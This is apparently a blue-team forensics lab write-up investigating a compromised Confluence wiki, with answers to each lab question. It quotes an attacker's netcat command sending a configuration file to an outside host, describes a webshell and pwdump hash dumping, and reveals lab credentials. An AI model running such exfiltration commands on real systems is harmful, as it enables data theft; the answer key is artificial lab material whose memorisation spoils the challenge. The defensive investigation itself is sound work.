# [Blue Team Labs Online - WikiLeaked](https://blueteamlabs.online/home/investigation/wikileaked-3386f9cde8)

![5f6eac452fd451e4fdfec79aa6a442cb.png](/resources/5f6eac452fd451e4fdfec79aa6a442cb.png)

Our corporate wiki was compromised! We don't know what happened, it all happened so quick! I only put the server online the day before!

>**Digital Forensics**

>**Tags**: Autopsy Wireshark Volatility jd-gui
* * *
**Scenario**
Hello Defender, you're just in time...

Our corporate wiki was compromised! We don't know what happened, it all happened so quick! I only put the server online the day before!

I managed to capture the following to help with the investigation:

- A memory dump from the Ubuntu webserver
- The memory profile needed to work with the memory dump
- The raw disk image from the Ubuntu webserver after a reboot to kill any connections!
- A packet capture from the database server

I’ve created an Autopsy case for you, you can access it from “Open Recent Case”.

I've also placed jd-gui & volatility in the folder to help you get moving quickly.

Unfortunately, I can't do anything that affects operations on the database server as it's critical to business operations, the packet capture was all I could grab. The database holds confidential employee data that needs to be available to other teams. We have pretty sick techniques to protect our data in the database, so I'm not too concerned about this data being leaked, but we need to get to the bottom of what has happened here as our shareholders are starting to panic.

If extracting anything malicious, please put it on the Desktop, or in the wikileaked folder on the Desktop - we don't want another fire drill!

Please can you help us understand what happened?
* * *
## Environment Awareness
### Evidence & Tool Discovery
![ef66627848eabead3647b4ac2cddd22d.png](/resources/ef66627848eabead3647b4ac2cddd22d.png)

We have everything we need for this investigation inside `wikileaked` folder on the Desktop, which we can read `README.txt` to find out what all the evidences we have along with tools available for us (or we can just read the scenario since its the same text)

* * *
## Investigation
>Q1) What is the name of the profile required to work with the memory dump (as shown in volatility)? (Format: string)

![98079fcecee49c55f2b97786a3cca1a0.png](/resources/98079fcecee49c55f2b97786a3cca1a0.png)

We have volatility 2 standalone and also a profile that we will have to use located here.

![1d0d5e88f259d562f9f5782c98c10bd0.png](/resources/1d0d5e88f259d562f9f5782c98c10bd0.png)

To import profile for volatility 2 standalone, we have to use command : `voltility.exe --plugins=profiles` where `profiles` is a folder that contains profile and if we specify `--info` to list all available plugin then you will see that we successfully imported the only Linux Ubuntu plugin for this investigation.

<details>
  <summary>Answer</summary>
<pre><code>LinuxUbuntu_4_4_0-142-genericx64</code></pre>
</details>

>Q2) What is the path to the wiki software? (Format: /something/something/something) 

![c42c9d41de9de533d40a78bd81a28835.png](/resources/c42c9d41de9de533d40a78bd81a28835.png)

Lets open Autopsy case and try to find where is the wiki on the server then we will come across Atlassian Confluence which is a web-based corporate wiki developed by Atlassian located at `/var/atlassian/confluence`

<details>
  <summary>Answer</summary>
<pre><code>/var/atlassian/confluence</code></pre>
</details>

>Q3) Reviewing the access logs, what CVE was exploited to gain access? (Format: CVE-XXXX-XXXXX)

![d2c30bd38ccc30c3df4d904cc0f98253.png](/resources/d2c30bd38ccc30c3df4d904cc0f98253.png)

First, we have to find confluence access log which located at `/opt/atlassian/confluence/logs`

![22e9157080fddb62a51982eb384a00c8.png](/resources/22e9157080fddb62a51982eb384a00c8.png)

There are so much to digest but we can see that the attacker successfully executed command via webshell at 2024-01-08 09:37:15

![41444534f967bd0b25fe34e616c90a61.png](/resources/41444534f967bd0b25fe34e616c90a61.png)

I tried to search on most recent Atlassian Confluence CVE and use that for threat hunt then we will finally find the right CVE which is [CVE-2023-22518](https://www.rapid7.com/blog/post/2023/11/06/etr-rapid7-observed-exploitation-of-atlassian-confluence-cve-2023-22518/)

![50f93b5f80697367717b3ec0f76c3eb7.png](/resources/50f93b5f80697367717b3ec0f76c3eb7.png)

Here is the successfully exploited of this vulnerability.

<details>
  <summary>Answer</summary>
<pre><code>CVE-2023-22518</code></pre>
</details>

>Q4) From the access logs, what is the timestamp of the request that executes the exploit? (Format: dd/mmm/yyyy:hh:mm:ss)

![50f93b5f80697367717b3ec0f76c3eb7.png](/resources/50f93b5f80697367717b3ec0f76c3eb7.png)
<details>
  <summary>Answer</summary>
<pre><code>08/Jan/2024:09:33:46</code></pre>
</details>

>Q5) What is the URL that the webshell was accessed on (no parameters)? (Format: http://something/path/to/something)

![fa0c061fa05a9d4cad23afc70ca7e6f1.png](/resources/fa0c061fa05a9d4cad23afc70ca7e6f1.png)

There we can see that this wiki was running on port 8090 and the webshell was accessed on `/plugins/servlet/com.jsos.shell/ShellServlet`

<details>
  <summary>Answer</summary>
<pre><code>http://51.89.173.52:8090/plugins/servlet/com.jsos.shell/ShellServlet</code></pre>
</details>

>Q6) What is the full path of the webshell on disk, and what is the INODE addresss (Format: /path/to/file.ext,0x\<address>)

By using command : `volatility.exe --plugins=profiles -f memory --profile=LinuxUbuntu_4_4_0-142-genericx64 linux_find_file > find_file.txt`, we will have a text file that stores an output of `linux_find_file` plugin

![eb3bbdfb3dd9ff8b664994430996c696.png](/resources/eb3bbdfb3dd9ff8b664994430996c696.png)

First, lets find out where is this webshell on the disk image which we can see that its located at `/opt/atlassian/confluence/temp`

![ff1b3d3935098a57146ee4edc0c245ee.png](/resources/ff1b3d3935098a57146ee4edc0c245ee.png)

Now we can search for webshell on `find_file.txt` to find its INODE address.

<details>
  <summary>Answer</summary>
<pre><code>/opt/atlassian/confluence/temp/plugin_6443315541471340356_shellplug.jar, 0xffff88010592b758</code></pre>
</details>

>Q7) What is the SHA256 hash of the webshell? (Format: string)

![e7042ac0715381d9a03078f430f93d73.png](/resources/e7042ac0715381d9a03078f430f93d73.png)

We can either extract it with Autopsy directly or use INODE address from previous question to dump file like this and we can also use `certutil` to calculate file hash of this file from the same terminal after we dumped it.

<details>
  <summary>Answer</summary>
<pre><code>48d9f0ba572f5c45ff8e9f8648d214a673c66c4607b3bced7ab36bff4bb2c6f4</code></pre>
</details>

>Q8) What is the servlet name of the webshell? (Format: string)

![e7bf2e725d5e7ca6b7a4af6cd8b8929c.png](/resources/e7bf2e725d5e7ca6b7a4af6cd8b8929c.png)

We can use JD gui (Java Decompiler) to decompile JAR file then we can find the servlet name of this webshell by inspecting `atlassian-plugin.xml`

<details>
  <summary>Answer</summary>
<pre><code>Shellz yo</code></pre>
</details>

>Q9) What is the method used by the webshell to execute commands? (Format: string)

![c6aa09b70891d4278e93757f7be8f8f4.png](/resources/c6aa09b70891d4278e93757f7be8f8f4.png)

By inspecting `ShellServlet` class, we can see that `executeCmd` is a function/method that can be used to execute command which will execute command via cmd if its Windows and if not then it will execute command via sh

<details>
  <summary>Answer</summary>
<pre><code>executeCmd</code></pre>
</details>

>Q10) What is the username & password that is visible in cleartext that appears to be used to connect to a server on the same network? (Format: username, password)

![d6eca0990450f9a663085441514cb700.png](/resources/d6eca0990450f9a663085441514cb700.png)

After inspecting `.bash_history` of root user, we can see that the attacker exfiltrated several file to 172.233.24.11 on port 8899

![204546b93a90c970b775dd18d74dbc4e.png](/resources/204546b93a90c970b775dd18d74dbc4e.png)

from `auth.log`, we can see username and a part password in cleartext was used to mount network share to `/mnt/remotebackups`

![961f1f5756e50ac05e0b038deef3c6c4.png](/resources/961f1f5756e50ac05e0b038deef3c6c4.png)

The file that related to mounting is `fstab` which is one of a file that was exfiltrated by the attacker.

<details>
  <summary>Answer</summary>
<pre><code>webserveradmin, 13!!--zxcv</code></pre>
</details>

>Q11) There is an interesting connection established between the webserver & database server, what port is this and what is the process detail? (Format: port, process/processID) 

![ed295b11b79734c8f613055994effed7.png](/resources/ed295b11b79734c8f613055994effed7.png)

By using `linux_netstat` plugin then we can see that the webserver established RDP connection to database server  

<details>
  <summary>Answer</summary>
<pre><code>3389, sshd/4144</code></pre>
</details>

>Q12) What command did the attacker use to exfiltrate one of the wiki config files from the webserver? (Format: string)

![821bee455bd190d4e189bd8c9ea3331c.png](/resources/821bee455bd190d4e189bd8c9ea3331c.png)

One of the file that was exfiltrated is `confluenc.cfg.xml` which is the Confluence configuration file.
<details>
  <summary>Answer</summary>
<pre><code>nc -w 3 172.233.24.11 8899 < /tmp/confluence.cfg.xml</code></pre>
</details>

>Q13) What is the software used on the misconfigured exfiltration FTP Server (don’t include version), port, valid username, and valid password? (Format: software, port, username, password)  

![c9cd04e5a4bbbb3953ef54ce4e8b58ce.png](/resources/c9cd04e5a4bbbb3953ef54ce4e8b58ce.png)

Its time for the pcap file located within database folder which we can use search function to find string like "username" which should be shown on the FTP communication but the first packet we found is not the right one since this is successful.

![e094a77d55da09ef7062bd7e6c567430.png](/resources/e094a77d55da09ef7062bd7e6c567430.png)

Then we will finally find the successful attempt of the attacker at frame 31748

![381d38f21fe1729cf57a23af5f16130c.png](/resources/381d38f21fe1729cf57a23af5f16130c.png)

There we have software, username and password.

<details>
  <summary>Answer</summary>
<pre><code>pyftpdlib, 1338, hax0r, JumanjiR0cks133@</code></pre>
</details>

>Q14) What is the user-agent used in the exfiltration over HTTP? (Format: string)

![822eaa37e8713cb2137a732ac3623222.png](/resources/822eaa37e8713cb2137a732ac3623222.png)

We can filter for HTTP request and focus on the attacker IP address which we can see that its using PowerShell to exfiltrated data over HTTP.

<details>
  <summary>Answer</summary>
<pre><code>Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.14393.693</code></pre>
</details>

>Q15) What is the name of the software and version used in the hash dumping? (Format: string vX.X)

![e1f1f30d9143b5c76f7bf9357b57481f.png](/resources/e1f1f30d9143b5c76f7bf9357b57481f.png)

By inspecting one of POST request then we can see that the attacker used [pwdump](https://attack.mitre.org/software/S0006/) version 8.2 to dump NTLM hash of the database server

<details>
  <summary>Answer</summary>
<pre><code>PwDump v8.2</code></pre>
</details>

>Q16) What are the cleartext values of EMP-TaxNumber & EMP-IBAN? (Format: TaxNumber, IBAN)

![0bec2a40a902e7fb2b81d97f4996cb5b.png](/resources/0bec2a40a902e7fb2b81d97f4996cb5b.png)

By inspect another POST request then we can see that its Postgres database dump which contains data of unfortunate employee and seem like TaxNumber is in Hex and IBAN is some BASE encoded

![f93835e3a25f2cefed4864aef6c8a7a0.png](/resources/f93835e3a25f2cefed4864aef6c8a7a0.png)	

Sure enough! TaxNumber is in Hex so we can convert it back to ASCII.

![47e6f6ea1ccd3d6d221cdd49b081dca5.png](/resources/47e6f6ea1ccd3d6d221cdd49b081dca5.png)

IBAN is base32 encoded so we can decode it to get the plaintext.

<details>
  <summary>Answer</summary>
<pre><code>33N0t4xm3,5002p4ym3n0w</code></pre>
</details>

>Q17) A database function is used to convert the data type of a field to integer a few times. What is the field that is being converted? (Format: string_string)

![b2ed85975564d59ccfadfadb0b7a2b3f.png](/resources/b2ed85975564d59ccfadfadb0b7a2b3f.png)

There are quite massive amount of PGSQL traffic within pcap file so After reviewing PGSQL traffic then we will see `entry_id` field was being converted to int which match what the question is asking for.

<details>
  <summary>Answer</summary>
<pre><code>entry_id</code></pre>
</details>

![9690ba00b2331517d96a9737990a71ef.png](/resources/9690ba00b2331517d96a9737990a71ef.png)
https://blueteamlabs.online/achievement/share/52929/189
* * *
## Summary
The attacker exploited CVE-2023-22518 of Atlassian Confluence resulting in accessing to the website then uploaded malicious jar file which is a webshell and used that to gain access to webserver as root.

The attacker exfiltrated several files from webserver which some of them contains cleartext username and password so the attacker used that to access database server via RDP.

The attacker also exploited misconfigured FTP to stage database file on the FTP server and finally exfiltrate NTML hash of database server with PWdump and Postgres database dump which contains Employee information.
* * *